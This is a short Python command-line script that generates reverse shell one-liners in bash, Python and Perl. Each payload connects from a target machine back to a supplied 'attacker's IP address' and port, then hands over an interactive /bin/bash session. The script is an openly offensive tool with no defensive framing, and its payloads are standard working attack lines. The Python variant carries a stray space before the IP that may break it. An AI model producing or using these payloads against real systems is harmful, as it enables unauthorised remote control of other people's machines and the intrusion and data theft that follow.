import argparse

def generate_reverse_shell_payload(ip, port, language):
    if language.lower() == 'bash':
        payload = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    elif language.lower() == 'python':
        payload = f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" {ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\''
    elif language.lower() == 'perl':
        payload = f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}};\''
    else:
        payload = "Language not supported."

    return payload

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reverse Shell Payload Generator")
    parser.add_argument("ip", help="Attacker's IP address")
    parser.add_argument("port", type=int, help="Attacker's port")
    parser.add_argument("language", choices=['bash', 'python', 'perl'], help="Desired language (bash, python, perl)")

    args = parser.parse_args()

    ip = args.ip
    port = args.port
    language = args.language

    reverse_shell_payload = generate_reverse_shell_payload(ip, port, language)
    print("Reverse Shell Payload:")
    print(reverse_shell_payload)
